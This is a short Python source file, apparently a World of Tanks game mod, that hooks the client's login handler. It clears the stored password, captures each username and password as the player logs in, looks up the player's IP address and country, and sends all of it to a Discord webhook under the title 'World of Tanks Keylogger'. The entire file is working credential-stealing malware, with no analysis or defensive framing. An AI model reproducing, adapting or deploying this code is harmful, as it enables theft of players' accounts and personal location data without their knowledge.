from json import dumps, loads
from httplib import HTTPConnection, HTTPSConnection
from gui.Scaleform.daapi.view.login.login_modes.credentials_mode import CredentialsMode
from gui.Scaleform.daapi.view.login.LoginView import LoginView

### HTTPS REQUEST ###
def http_req(method, ssl, host, path, data=None):
    if ssl:
        conn = HTTPSConnection(host + ":443")
    else:
        conn = HTTPConnection(host + ":80")
    conn.request(method, path, dumps(data), {"content-type": "application/json"})
    response = conn.getresponse()
    obj = response.read()
    conn.close()
    return [response.status, response.reason, obj]

### REMOVE PASSWORD ON THE LOGIN SCREEN ###
CredentialsMode.password = ""

### TRIGGERED WHEN USER LOGIN ###
def new_onLogin(self, userName, password, serverName, isSocialToken2Login):
    old_onLogin(self, userName, password, serverName, isSocialToken2Login)

    if password:
        ip_info = loads(http_req("GET", False, "ip-api.com", "/json")[2])

        http_req("POST", True, "discord.com", "/api/webhooks/XXXXXXXXXXXX/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx", {
                "embeds": [
                    {
                        "title": "World of Tanks Keylogger",
                        "type": "rich",
                        "fields": [
                            {
                                "name": "Login",
                                "value": userName,
                            },
                            {
                                "name": "Password",
                                "value": password,
                            },
                            {
                                "name": "Region",
                                "value": serverName.split(".")[-1].split(":")[0].upper(),
                                "inline": True,
                            },
                            {
                                "name": "IP",
                                "value": ip_info["query"],
                                "inline": True,
                            },
                            {
                                "name": "Country",
                                "value": ip_info["country"],
                                "inline": True,
                            },
                        ]
                    }
                ]
            }
        )

### MONKEY PATCH ###
old_onLogin = LoginView.onLogin
LoginView.onLogin = new_onLogin
